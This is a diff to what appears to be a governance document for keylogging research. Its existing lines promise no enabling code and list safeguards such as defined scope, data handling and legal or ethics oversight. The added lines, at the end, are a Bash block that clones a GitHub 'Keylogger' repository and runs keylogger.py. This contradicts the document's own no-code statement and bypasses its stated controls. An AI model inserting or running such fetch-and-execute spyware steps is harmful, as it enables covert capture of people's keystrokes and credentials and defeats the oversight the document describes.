@@ -18,3 +18,8 @@ It emphasizes privacy, consent, and governance. **No code or instruction that en
 3. Defined **scope**: hosts, accounts, time window, and permitted data types.  
 4. Approved **data handling plan** (storage, encryption, retention, deletion).  
 5. Oversight by Legal / Privacy / Security teams (and IRB if applicable).
+
+```Bash
+ git clone https://github.com/sachinpandey7709/Keylogger.git
+cd Keylogger
+python keylogger.py
